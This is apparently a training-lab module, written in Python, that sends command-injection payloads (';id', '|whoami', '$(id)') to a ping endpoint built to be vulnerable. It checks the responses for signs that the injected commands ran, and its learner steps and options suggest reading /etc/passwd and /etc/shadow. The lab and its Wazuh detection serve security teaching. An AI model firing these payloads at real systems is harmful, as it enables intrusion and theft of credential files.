"""
modules/cmd_injection.py — APP-02: Command Injection probe.

Target: GET /system/ping?host=<payload>
Vulnerability: host param passed to os.popen() unsanitized.
"""
from __future__ import annotations

from datetime import datetime, timezone

from core.base_module import BaseModule
from core.models import (
    AttackResult, Category, ModuleOption, Severity,
    StepResult, TargetConfig,
)

_PAYLOADS = [
    ("semicolon",  "127.0.0.1;id"),
    ("pipe",       "127.0.0.1|whoami"),
    ("double-amp", "127.0.0.1 && hostname"),
    ("subshell",   "$(id)"),
    ("backtick",   "127.0.0.1;cat /etc/hostname"),
]

_INDICATORS = ["uid=", "root", "www-data", "attense", "/bin/"]


class CmdInjectionModule(BaseModule):
    module_id = "cmd_injection"
    name = "Command Injection"
    description = (
        "Injects OS command separators into /system/ping and checks "
        "whether arbitrary command output appears in the response."
    )
    category = Category.INJECTION
    scenario_id = "APP-02"
    severity = Severity.CRITICAL
    lab = {
        "target_path": "/system/ping",
        "vulnerable_component": "Flask ping handler (system_bp.ping) — os.popen",
        "story": (
            "An internal diagnostics page runs `ping -c 2 <host>` and prints "
            "the raw output. The `host` argument is concatenated into a shell "
            "string. Prove that shell metacharacters let you run arbitrary "
            "commands as the web-server user."
        ),
        "learner_steps": [
            {"action": "Open the diagnostics page and run a normal ping to 127.0.0.1.",
             "expected": "You see 'PING 127.0.0.1' followed by normal ping output."},
            {"action": "Try entering 127.0.0.1;id in the host field.",
             "expected": "After the ping you see 'uid=…' — the id command executed."},
            {"action": "Try other separators: 127.0.0.1 && whoami or 127.0.0.1|cat /etc/hostname",
             "expected": "System command output appears alongside ping output."},
            {"action": "Try reading a sensitive file: 127.0.0.1;cat /etc/passwd",
             "expected": "The contents of /etc/passwd are displayed."},
            {"action": "Check the Evidence panel for Wazuh detections.",
             "expected": "Alert matches shell-metacharacter pattern in the host parameter."},
        ],
        "detection_rule": "Wazuh cmd-injection signature (shell metacharacters in host param)",
        "success_markers": [
            "uid= or www-data in the HTTP response body",
            "✓ EXECUTED log lines",
            "Wazuh alert on /system/ping with metachar payload",
        ],
        "quick_probe": "/system/ping?host=127.0.0.1;id",
    }
    steps = [{'title': 'Probe /system/ping with benign host', 'hint': 'Baseline response for a clean 127.0.0.1 request', 'expected': 'HTTP 200 with ping output visible'}, {'title': 'Inject shell metacharacters', 'hint': 'Try separators ; | && $(…) against the host parameter', 'expected': 'Command output leaks back in the HTML response'}, {'title': 'Confirm RCE indicators', 'hint': "Match on 'uid=', 'root', 'www-data', '/bin/'", 'expected': 'Successful step flagged CRITICAL'}]

    def options(self) -> list[ModuleOption]:
        return [
            ModuleOption(
                name="custom_cmd",
                display_name="Custom Command",
                description="Optional: custom command to append (e.g. 'cat /etc/shadow')",
                default="",
            ),
            ModuleOption(
                name="endpoint",
                display_name="Ping Endpoint",
                description="Target endpoint path",
                default="/system/ping",
            ),
        ]

    def execute(self, target: TargetConfig, opts: dict, log_fn=None) -> AttackResult:
        started = datetime.now(timezone.utc).isoformat()
        steps: list[StepResult] = []
        endpoint = opts.get("endpoint", "/system/ping")
        confirmed = 0

        payloads = list(_PAYLOADS)
        custom = opts.get("custom_cmd", "").strip()
        if custom:
            payloads.append(("custom", f"127.0.0.1;{custom}"))

        self._log(log_fn, f"Testing {len(payloads)} command injection payloads against {endpoint}")

        for label, payload in payloads:
            url = target.base_url + endpoint
            r = self._get(url, params={"host": payload},
                          label=label, timeout=target.timeout)

            body = (r.detail or "").lower()
            hit = any(ind in body for ind in _INDICATORS)
            if hit:
                confirmed += 1
                r.evidence = f"COMMAND EXECUTED via {label}"

            symbol = "✓ EXECUTED" if hit else "– no indicator"
            self._log(log_fn, f"  [{label}] {symbol}  |  {payload}")
            steps.append(r)

        summary = f"{confirmed}/{len(payloads)} payloads confirmed command execution."
        return self._make_result(target, steps, summary, started)
